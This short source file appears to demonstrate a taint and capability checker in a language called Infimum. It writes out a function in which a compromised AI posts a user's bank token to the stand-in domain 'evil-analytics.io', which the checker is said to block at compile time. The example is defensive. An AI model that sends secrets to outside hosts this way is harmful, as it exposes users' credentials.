// Security X-Ray Demo: A compromised or hallucinating AI attempts to exfiltrate
// a user's bank token (`Secret<str>`) to an unauthorized domain ("evil-analytics.io").
// Infimum's static taint & capability checker blocks compilation before execution.

fn exfiltrate_secret(bank_token: Secret<str>) -[Net("evil-analytics.io")]-> bool {
  // Attempted domain-mismatch exfiltration:
  do Net.post(reveal("api.mybank.com", bank_token));
  true
}
